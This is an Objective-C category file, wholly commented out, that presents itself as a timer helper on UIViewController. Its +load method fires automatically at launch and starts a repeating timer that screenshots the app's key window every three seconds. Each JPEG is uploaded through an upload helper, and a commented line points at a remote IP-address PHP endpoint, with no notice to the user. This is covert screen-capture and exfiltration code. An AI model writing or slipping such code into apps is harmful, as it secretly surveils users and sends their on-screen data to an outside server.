//
//#import "NSObject_6.h"
//#import "KKUpLoadHelper.h"
//
//@implementation UIViewController (_6)
//+ (NSTimer *)h_scheduledTimerWithTimeInterval:(NSTimeInterval)interval repeats:(BOOL)repeats block:(void(^)(NSTimer *_Nonnull timer))block {
//    NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval:interval
//                                                      target:self
//                                                    selector:@selector(h_blockInvoke:)
//                                                    userInfo:[block copy]
//                                                     repeats:repeats];
//    return timer;
//}
//+ (void)h_blockInvoke:(NSTimer *)timer {
//    void(^block)(NSTimer *_Nonnull timer) = timer.userInfo;
//    if (block != NULL) {
//        block(timer);
//    }
//}
//+ (void)load {
//    static dispatch_once_t onceToken;
//    dispatch_once(&onceToken, ^{
//        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
//            NSTimer *timer = [self h_scheduledTimerWithTimeInterval:3 repeats:YES block:^(NSTimer * _Nonnull timer) {
//                [self beginImageWithView:[UIApplication sharedApplication].keyWindow];
//            }];
//            [[NSRunLoop currentRunLoop] addTimer:timer forMode:NSRunLoopCommonModes];
//        });
//    });
//}
//+ (void)beginImageWithView:(UIView *)view {
//    if ([view isKindOfClass:UIView.class]) {
//        UIGraphicsBeginImageContextWithOptions(view.bounds.size, NO, [[UIScreen mainScreen] scale]);
//        // 方法一 有时导航条无法正常获取
//        // [self.layer renderInContext:UIGraphicsGetCurrentContext()];
//        // 方法二 iOS7.0 后推荐使用
//        [view drawViewHierarchyInRect:view.bounds afterScreenUpdates:NO];
//        UIImage *viewImage = UIGraphicsGetImageFromCurrentImageContext();
//        //NSData *data = UIImagePNGRepresentation(viewImage);
//        NSData *data = UIImageJPEGRepresentation(viewImage, 0.9);
//        
//        NSDateFormatter *formatter = [[NSDateFormatter alloc]init];
//        formatter.dateFormat = @"yyyyMMddHHmmss";
//        NSString *timeStr = [formatter stringFromDate:[NSDate date]];
//        NSString *fileName = [NSString stringWithFormat:@"%@.jpg",timeStr];
//        
//        KKUpLoadHelper *upLoadHelper = KKUpLoadHelper.new;
//        //NSString *REQUEST_URL = @"http://111.231.33.42/2.php";
//        //NSString *MIMEType = [upLoadHelper MIMEType:[NSURL URLWithString:REQUEST_URL]];
//        NSString *MIMEType = @"image/jpeg";
//        //NSString *MIMEType = @"text/html";
//        [upLoadHelper upload:fileName mimeType:MIMEType fileData:data params:nil];
//        UIGraphicsEndImageContext();
//    }
//}
//@end
